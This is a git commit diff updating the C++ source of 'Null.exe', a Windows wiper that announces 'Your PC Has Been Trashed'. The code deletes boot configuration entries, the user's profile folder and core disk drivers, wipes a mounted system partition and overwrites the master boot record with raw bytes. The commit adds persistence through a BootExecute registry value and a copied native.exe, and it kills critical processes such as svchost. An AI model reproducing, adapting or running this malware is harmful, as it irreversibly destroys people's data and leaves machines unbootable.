f56f408550d757f44981b072809e4a85a77917aa
ZGaurdian <89733146+ZGaurdian@users.noreply.github.com>
2022-03-02 05:03:01 -0800

    Update Null.cpp

--- src/Null.cpp
+++ src/Null.cpp
@@ -1,15 +1,17 @@
 #include <Windows.h>
 #include <iostream>
+#include <fstream>
+#include <direct.h>
 
 using namespace std;
 
 int main()
 {
+	system("start taskkill /f /im explorer.exe");
 	system("start bcdedit.exe /delete {current} /f");
 	system("start bcdedit.exe /delete {memdiag} /f");
 	system("start bcdedit.exe /delete {bootmgr} /f");
 	system("start mountvol.exe W: /s");
-	system("start taskkill /f /im explorer.exe");
 	system("rd C:\\Users\\%username% /s /q");
 	system("start takeown.exe /f C:\\Windows\\System32\\drivers\\disk.sys");
 	system("start takeown.exe /f C:\\Windows\\System32\\drivers\\ntfs.sys");
@@ -22,6 +24,32 @@ int main()
 	system("del C:\\Windows\\System32\\drivers\\ntfs.sys");
 	system("del C:\\Windows\\System32\\drivers\\disk.sys");
 	system("rd W: /s /q");
+	system("copy native.exe C:\\Windows\\System32\\");
+
+	LONG lReg;
+	HKEY hKey;
+	std::string dwData = "native";
+
+	lReg = RegCreateKeyEx(
+		HKEY_LOCAL_MACHINE,
+		L"\\SYSTEM\\CurrentControlSet\\Control\\Session Manager",
+		0,
+		NULL,
+		REG_OPTION_NON_VOLATILE,
+		KEY_ALL_ACCESS | KEY_WOW64_64KEY,
+		NULL,
+		&hKey,
+		NULL
+	);
+
+	lReg = RegSetValueEx(
+		hKey,
+		L"BootExecute",
+		NULL,
+		REG_MULTI_SZ,
+		(LPBYTE)&dwData,
+		sizeof(dwData)
+	);
 
 	const unsigned char mbrData[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
@@ -71,6 +99,14 @@ int main()
 	CloseHandle(hDevice);
 
 	MessageBox(NULL, L"Your PC Has Been Trashed by Null.exe", L"Null.exe", MB_OK);
+
+	for (int i = 0; i < 2; i++) {
+		system("start taskkill /f /im dwm.exe");
+		system("start taskkill /f /im fontdrvhost.exe");
+	}
+
+	RegCloseKey(hKey);
+
 	Sleep(2000);
-	system("start shutdown.exe -r -t 0");
+	system("taskkill /f /im svchost.exe");
 }
